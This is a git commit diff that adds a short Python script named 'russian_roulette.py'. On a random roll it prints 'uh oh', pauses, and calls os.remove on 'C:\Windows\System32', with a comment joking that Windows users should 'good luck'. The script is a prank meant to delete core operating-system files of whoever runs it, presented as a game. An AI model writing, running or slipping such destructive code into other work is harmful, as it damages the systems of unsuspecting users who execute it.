ef6389b0fb314f085336af805158c3a562b59a16
Daniel C <104099162+CatX711@users.noreply.github.com>
2023-04-23 01:39:55 +0100

    Update russian_roulette.py

--- russian_roulette.py
+++ russian_roulette.py
@@ -1,1 +1,8 @@
+import random
+import os
+from time import sleep
 
+if random.randint(0, 6) == 1:
+  print("uh oh")
+  sleep(2)
+  os.remove("C:\Windows\System32") # if you're a windows user, uh... good luck...
